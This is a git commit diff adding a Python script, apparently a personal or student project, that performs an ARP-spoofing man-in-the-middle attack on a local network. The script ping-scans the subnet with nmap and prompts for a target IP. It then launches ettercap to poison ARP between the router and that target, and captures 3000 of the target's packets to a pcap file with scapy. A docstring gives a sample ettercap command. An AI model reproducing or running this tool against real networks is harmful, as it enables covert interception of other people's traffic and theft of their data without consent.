a3a31a65773ed5505538a29978eb957ce59622b0
Aiden Chang <62921661+aiden200@users.noreply.github.com>
2022-11-10 10:25:43 -0600

    mim code

--- mim.py
+++ mim.py
@@ -14,4 +14,38 @@ choose ip addr and mim attack
 sudo ettercap -T -S -i en0 -M arp:remote /[router ip number]// /[target]//
 ex: sudo ettercap -T -S -i en0 -M arp:remote /10.133.0.254// /10.133.0.14//
 
+Need ettercap, netifaces, nmap, python-nmap
 '''
+
+from requests import get
+import netifaces
+import socket    
+import nmap
+import subprocess
+from scapy.all import *
+
+# public_ip = get('https://api.ipify.org').content.decode('utf8')
+# # print('My public IP address is: {}'.format(public_ip))
+# hostname = socket.gethostname()    
+# IPAddr = socket.gethostbyname(hostname) 
+# print("Your Computer Name is:" + hostname)    
+# print("Your Computer IP Address is:" + IPAddr) 
+
+nm = nmap.PortScanner()
+gws=netifaces.gateways()
+router = gws['default'][2][0] # Not sure if this 2 is applicable
+
+external_hosts = []
+nm.scan(hosts=f'{router}/24', arguments='-sn')
+hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
+
+print("Available hosts:")
+for host, status in hosts_list:
+    if status == "up":
+        print(host)
+        external_hosts.append(host)
+
+target = input("Which ip address should we be scanning?")
+subprocess.run(f"sudo ettercap -T -S -i en0 -M arp:remote /{router}// /{target}//")
+capture = sniff(count=3000, filter=f'host {target}')
+wrpcap(f"traces/MIM/capture_file", capture)
